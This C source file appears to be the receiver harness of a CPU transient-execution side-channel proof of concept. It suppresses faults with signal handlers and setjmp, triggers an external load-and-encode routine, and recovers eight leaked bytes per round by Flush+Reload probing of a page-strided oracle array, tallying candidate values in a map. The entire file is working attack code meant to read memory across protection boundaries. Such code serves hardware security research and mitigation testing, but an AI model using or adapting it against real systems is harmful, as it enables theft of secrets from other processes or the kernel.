#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <setjmp.h>
#include "lib.h"
#include "cacheutils.h"

#define BYTE_TRY 8
#define PAGE_SIZE 4096
#define CACHE_SIZE 64

extern uint64_t CACHE_THRESHOLD;
extern uint8_t *oracles;

extern void s_load_encode(uint64_t *perm);

uint64_t perm[8] = {0};

void intHandler(int dummy)
{
    printf("\n");
    map_dump();
    exit(0);
}

int main(int argc, char *argv[])
{

    signal(SIGINT, intHandler);
    signal(SIGSEGV, trycatch_segfault_handler);
    signal(SIGFPE, trycatch_segfault_handler);

    CACHE_MISS = detect_flush_reload_threshold();

    map_create();

    for (int i = 0; i < 8; i++)
    {
        perm[i] = i + atoi(argv[1]);
    }

    while (1)
    {
        if (!setjmp(trycatch_buf))
            s_load_encode(perm);

        char indexes[BYTE_TRY + 1];
        memset(indexes, 0, BYTE_TRY + 1);

        for (size_t c = 0; c < BYTE_TRY; c++)
        {
            for (size_t i = 0; i < 256; i++)
            {
#if 0
                int mix_i = i;
#else
                int mix_i = ((i * 167) + 13) & 255;
#endif
                if (flush_reload((uint8_t *)&oracles + (mix_i + (c * 256)) * PAGE_SIZE))
                {
                    indexes[c] = (mix_i + (c * 256)) % 256;
                }
            }
        }

        if (strlen(indexes) >= 8)
        {
            map_increment(indexes);
        }
    }
    return 0;
}
